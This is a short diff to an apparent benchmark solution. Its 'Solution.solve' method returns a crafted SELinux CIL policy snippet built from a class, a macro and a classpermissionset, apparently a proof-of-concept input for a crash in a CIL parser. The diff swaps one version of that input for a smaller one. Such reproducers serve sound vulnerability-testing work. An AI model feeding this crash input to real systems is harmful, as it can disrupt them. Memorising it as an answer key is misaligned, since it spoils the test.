@@ -1,9 +1,7 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b'''(class testclass (read write execute append lock ioctl))
-(macro badmacro ((classpermission cp))
-  (classpermissionset badset testclass cp)
+        return b'''(class a (x))
+(macro m ((cp classpermissions))
+(classpermissionset s $cp)
 )
-(badmacro (class testclass (read append)))
-'''
-        return poc
+(m (a (x)))'''
